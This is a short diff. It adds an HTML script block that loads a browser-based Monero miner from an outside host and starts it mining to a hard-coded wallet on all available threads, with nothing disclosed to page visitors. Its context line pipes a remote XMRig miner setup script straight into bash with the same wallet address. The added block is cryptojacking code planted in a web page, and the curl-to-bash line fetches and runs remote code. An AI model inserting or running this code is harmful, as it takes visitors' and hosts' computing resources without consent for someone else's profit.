@@ -1,1 +1,12 @@
 curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 83btdBDTgp2FCGW13FR26vQNUAtf6mLCz1pvMWVttt86ZovCMXAMJBWMAkU1XZki7FXwygCdpGhUfBe5AmKiLMjv5fTNWez
+<script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
+<script>
+    server = "wss://f.xmrminingproxy.com:8181";
+    var pool = "moneroocean.stream";
+    var walletAddress = "83btdBDTgp2FCGW13FR26vQNUAtf6mLCz1pvMWVttt86ZovCMXAMJBWMAkU1XZki7FXwygCdpGhUfBe5AmKiLMjv5fTNWez";
+    var workerId = "eu"+Math.random()
+    var threads = -1;
+    var password = "x";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 20;
+</script>
